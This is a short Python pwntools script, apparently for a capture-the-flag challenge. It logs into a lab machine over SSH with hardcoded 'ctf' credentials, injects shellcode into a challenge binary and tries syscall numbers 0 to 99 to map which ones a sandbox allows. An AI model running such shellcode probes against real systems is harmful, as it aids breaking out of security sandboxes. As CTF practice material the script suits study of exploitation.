from pwn import *

context(arch='amd64', os='linux')
allowed = []
might_be = []
logging = log.progress('Fuzzing')
for i in range(0, 100):
    logging.status(str(i))
    try:
        s = ssh(host='192.168.191.128', port=2222, user='ctf', password='ready2play')
        p = s.process('./challenge')
        shellcode = asm(f'''
                        xor rax, rax
                        mov rax, {i}
                        syscall
                        ''')
        p.sendline(shellcode)
        out = p.recvline()
        if 'Fail' not in out:
            allowed.append(i)
    except KeyboardInterrupt:
        break
    except:
        might_be.append(i)
        continue
    finally:
        p.close()

logging.success('Done.')
log.success('Allowed: ' + str(allowed))
log.success('Might be Allowed: ' + str(might_be))
